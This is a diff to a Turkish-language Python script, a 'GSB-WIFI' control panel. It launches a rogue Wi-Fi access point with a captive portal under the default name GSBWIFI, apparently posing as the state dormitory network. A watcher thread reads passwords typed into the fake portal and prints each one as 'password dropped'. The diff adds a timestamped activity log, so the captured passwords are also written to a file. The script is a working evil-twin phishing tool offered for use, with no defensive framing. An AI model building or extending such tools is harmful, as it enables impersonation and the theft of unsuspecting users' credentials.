@@ -6,11 +6,13 @@ import sys
 import threading
 import re
 import argparse
+from datetime import datetime
 
 # --- AYARLAR & RENKLER ---
 GREEN, RED, YELLOW, CYAN, NC = '\033[0;32m', '\033[0;31m', '\033[1;33m', '\033[0;36m', '\033[0m'
 PASS_FILE = "/etc/nodogsplash/passwords.txt"
 LOGGER_PATH = "/etc/nodogsplash/htdocs/resources/images/logger.py"
+LOG_FILE = "gsb_activity.log"
 print_lock = threading.Lock()
 active_clients = set() 
 
@@ -19,53 +21,50 @@ REQUIRED_PACKAGES = ["create_ap", "nodogsplash", "dnsmasq", "python3", "fuser", 
 
 # --- ARGÜMAN YÖNETİMİ ---
 parser = argparse.ArgumentParser(description='GSB-WIFI Otomasyon Paneli')
-parser.add_argument('-i', '--interface', help='Yayın yapılacak Wi-Fi kartı (örn: wlan0)')
+parser.add_argument('-i', '--interface', help='Yayın yapılacak Wi-Fi kartı')
 parser.add_argument('-s', '--ssid', default='GSBWIFI', help='Yayınlanacak ağ adı')
 args = parser.parse_args()
+
+def write_to_log(message):
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    clean_msg = re.sub(r'\033\[[0-9;]*m', '', message) # Renkleri temizle
+    with open(LOG_FILE, "a") as f:
+        f.write(f"[{timestamp}] {clean_msg}\n")
+
+def safe_print(msg, log_it=True):
+    with print_lock:
+        sys.stdout.write(f"\r\033[K{msg}\n")
+        sys.stdout.flush()
+    if log_it:
+        write_to_log(msg)
 
 def check_dependencies():
     missing = []
     for pkg in REQUIRED_PACKAGES:
-        # 'which' komutu aracın sistem yolunda olup olmadığını kontrol eder
         check = subprocess.run(["which", pkg], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         if check.returncode != 0:
             missing.append(pkg)
-
     if missing:
-        print(f"{RED}[!] HATA: Aşağıdaki paketler sistemde yüklü değil:{NC}")
-        for m in missing:
-            print(f"  - {m}")
-        print(f"\n{YELLOW}[*] Yüklemek için: {NC}sudo apt update && sudo apt install {' '.join(missing)}")
+        print(f"{RED}[!] HATA: Eksik paketler: {', '.join(missing)}{NC}")
+        print(f"{YELLOW}[*] Yüklemek için: {NC}sudo apt update && sudo apt install {' '.join(missing)}")
         sys.exit(1)
 
-def safe_print(msg):
-    with print_lock:
-        sys.stdout.write(f"\r\033[K{msg}\n")
-        sys.stdout.flush()
-
 def clean_exit(sig, frame):
-    # Terminali temizle ve sadece çıkış mesajı ver
     sys.stdout.write(f"\r\033[K{YELLOW}[!] Çıkılıyor...{NC}\n")
     sys.stdout.flush()
+    write_to_log("OPERASYON DURDURULDU.")
     
-    # 1. Süreçleri ve portları sustur (Sessiz mod: Tüm çıktıları DEVNULL'a gönder)
     DEVNULL = subprocess.DEVNULL
     subprocess.run(["sudo", "pkill", "-9", "-f", "nodogsplash"], stdout=DEVNULL, stderr=DEVNULL)
     subprocess.run(["sudo", "pkill", "-9", "-f", "create_ap"], stdout=DEVNULL, stderr=DEVNULL)
     subprocess.run(["sudo", "pkill", "-9", "-f", "logger.py"], stdout=DEVNULL, stderr=DEVNULL)
     subprocess.run(["sudo", "pkill", "-9", "dnsmasq"], stdout=DEVNULL, stderr=DEVNULL)
-    
-    # 64904 gibi PID'lerin ekrana düşmesini engellemek için stdout=DEVNULL ekledik
     subprocess.run(["sudo", "fuser", "-k", "53/udp"], stdout=DEVNULL, stderr=DEVNULL)
     subprocess.run(["sudo", "fuser", "-k", "53/tcp"], stdout=DEVNULL, stderr=DEVNULL)
-    
-    # 2. Arayüz ve Servis Onarımı (Sessizce)
     subprocess.run(["sudo", "ip", "addr", "flush", "dev", "lo"], stdout=DEVNULL, stderr=DEVNULL)
     subprocess.run(["sudo", "ip", "addr", "add", "127.0.0.1/8", "dev", "lo"], stdout=DEVNULL, stderr=DEVNULL)
     subprocess.run(["sudo", "ip", "link", "set", "lo", "up"], stdout=DEVNULL, stderr=DEVNULL)
     subprocess.run(["sudo", "systemctl", "stop", "dnsmasq"], stdout=DEVNULL, stderr=DEVNULL)
-    
-    # 3. systemd-resolved Canlandırma
     subprocess.run(["sudo", "systemctl", "reset-failed", "systemd-resolved"], stdout=DEVNULL, stderr=DEVNULL)
     subprocess.run(["sudo", "systemctl", "stop", "systemd-resolved"], stdout=DEVNULL, stderr=DEVNULL)
     time.sleep(1)
@@ -93,17 +92,18 @@ def password_watcher():
             if not line:
                 time.sleep(0.5)
                 continue
+            # Şifre düştüğündeki o kutucuk formatı
             safe_print(f"{RED}[!!!] ŞİFRE DÜŞTÜ:{NC}")
             safe_print(f"{GREEN}  > {line.strip()}{NC}")
             safe_print(f"{CYAN}----------------------------------------------{NC}")
 
 def run():
     check_dependencies()
-
     ifaces = get_interfaces()
     all_sys_ifaces = os.listdir('/sys/class/net')
 
     os.system('clear')
+    write_to_log("--- YENİ OPERASYON BAŞLATILDI ---")
     print(f"{CYAN}=============================================={NC}")
     print(f"{YELLOW}          GSB-WIFI YÖNETİCİ PANELİ             {NC}")
     print(f"{CYAN}=============================================={NC}")
@@ -123,9 +123,9 @@ def run():
             break
 
     os.system('clear')
-    safe_print(f"{CYAN}=============================================={NC}")
-    safe_print(f"{YELLOW}          GSB-WIFI OPERASYON PANELI             {NC}")
-    safe_print(f"{CYAN}=============================================={NC}")
+    print(f"{CYAN}=============================================={NC}")
+    print(f"{YELLOW}          GSB-WIFI OPERASYON PANELI             {NC}")
+    print(f"{CYAN}=============================================={NC}")
     safe_print(f"[*] SSID  : {GREEN}{args.ssid}{NC}")
     safe_print(f"[*] Yayın : {GREEN}{INTERFACE}{NC}")
     safe_print(f"[*] Kaynak: {YELLOW}{INTERNET_INT}{NC}")
@@ -144,7 +144,7 @@ def run():
 
     time.sleep(1)
     safe_print(f"{GREEN}[!] SİSTEM HAZIR. Dinleniyor...{NC}")
-    safe_print(f"{CYAN}----------------------------------------------{NC}")
+    safe_print(f"{CYAN}----------------------------------------------{NC}", log_it=False)
 
     threading.Thread(target=password_watcher, daemon=True).start()
 
